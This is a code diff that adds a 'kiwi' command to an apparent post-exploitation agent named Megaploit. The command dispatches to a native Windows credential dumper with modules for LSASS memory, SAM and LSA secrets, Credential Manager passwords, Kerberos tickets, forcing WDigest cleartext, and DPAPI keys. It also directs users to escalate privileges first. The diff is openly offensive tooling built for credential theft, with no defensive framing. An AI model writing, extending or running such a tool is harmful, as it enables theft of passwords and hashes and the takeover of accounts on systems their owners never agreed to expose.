@@ -3693,3 +3693,58 @@ def _browser_creds(conn, args: list[str]) -> str:
         )
 
     return "\n".join(output)
+
+
+# ---------------------------------------------------------------------------
+# Kiwi — native C credential dumper (Windows)
+# ---------------------------------------------------------------------------
+
+@_register("kiwi")
+def _kiwi(conn, args: list[str]) -> str:
+    """
+    Megaploit Kiwi — advanced Windows credential harvester backed by a
+    compiled C binary (megaploit_kiwi.exe / megaploit_kiwi).
+
+    The binary is compiled on first use from
+    megaploit/native/kiwi/megaploit_kiwi.c (requires gcc / MinGW-w64 / MSVC).
+
+    Usage:  kiwi <module>  [args]
+
+    Modules
+    -------
+      logonpasswords   LSASS process memory — NTLM hashes + cleartext
+      sam              SAM hive offline dump — local account hashes
+      lsa              LSA secrets dump
+      credman          Windows Credential Manager stored passwords
+      tickets          Kerberos TGT/TGS ticket cache
+      wdigest          Re-enable WDigest cleartext + harvest
+      dpapi            DPAPI masterkey GUID enumeration
+      all              Run every module
+
+    Requires
+    --------
+      logonpasswords / sam / lsa : SYSTEM or SeDebugPrivilege (use getsystem first)
+      credman / tickets / dpapi  : current interactive user
+    """
+    module = args[0].lower() if args else ""
+    if not module:
+        return (
+            "Usage: kiwi <module>\n"
+            "Modules: logonpasswords sam lsa credman tickets wdigest dpapi all"
+        )
+
+    # Dynamically import kiwi_runner so the agent does not need it at load time
+    try:
+        import importlib.util as _ilu
+        import os as _os
+        _runner_path = _os.path.join(
+            _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))),
+            "native", "kiwi", "kiwi_runner.py"
+        )
+        _spec = _ilu.spec_from_file_location("kiwi_runner", _runner_path)
+        _mod  = _ilu.module_from_spec(_spec)      # type: ignore[arg-type]
+        _spec.loader.exec_module(_mod)             # type: ignore[union-attr]
+        extra = args[1:] if len(args) > 1 else []
+        return _mod.run_kiwi(module, extra_args=extra)
+    except Exception as exc:
+        return f"[-] kiwi: runner error — {exc}"
